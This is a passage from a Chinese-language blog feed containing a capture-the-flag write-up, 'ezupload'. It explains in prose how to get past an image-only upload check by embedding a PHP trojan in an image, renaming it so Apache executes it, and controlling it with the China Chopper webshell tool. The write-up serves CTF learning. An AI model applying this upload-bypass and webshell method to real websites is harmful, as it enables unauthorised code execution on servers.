id="ezupload"><a href="#ezupload" class="headerlink" title="ezupload"></a>ezupload</h2><p>本题是一个中规中矩的文件上传漏洞.</p><p>打开题目链接，我们先上传一个图片文件.上传成功，回显图片的路径.</p><p>继续上传一个php文件，便发现提示It is not a image,上传失败.</p><p>我们抓包分析一下，修改Content-Type: image/jpeg，和文件后缀，还是不能上传php文件.</p><p>想到还有一种检测文件的方法，那就是文件头标志.</p><p>于是我上传了一个图片木马，即php木马隐藏在图片中,抓包，修改文件后缀名,上传成功，但是文件后缀名被改为peg</p><p>经过一番测试，发现它是自动将文件的三位后缀名替换为peg. 我们将文件名改成mu.jpg.php,上传成功，网站打开发现，mu.peg.php 解析成功. 这考虑的是apache的特性 从后往前识别</p><h2 id=""><a href="#" class="headerlink" title=" "></a> </h2><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808211643_505.png" alt=""></p><p>连接菜刀，拿到flag.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;奇怪的恐龙特性&quot;&gt;&lt;a href=&quot;#奇怪的恐龙特性&quot; class=&quot;headerlink&quot; title=&quot;奇怪的恐龙特性&quot;&gt;&lt;/a&gt;奇怪的恐龙特性&lt;/h2&gt;&lt;p&gt;题目&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;大约在15亿年前，生活在地球上的恐龙中有一种很奇怪的恐龙，他们有
      
    
    </summary>
    
      <category term="CTF" scheme="http://Bigbroke.com/categories/CTF/"/>
    
    
      <category term="CTF" scheme="http://Bigbroke.com/tags/CTF/"/>
    
  </entry>
  
</feed>
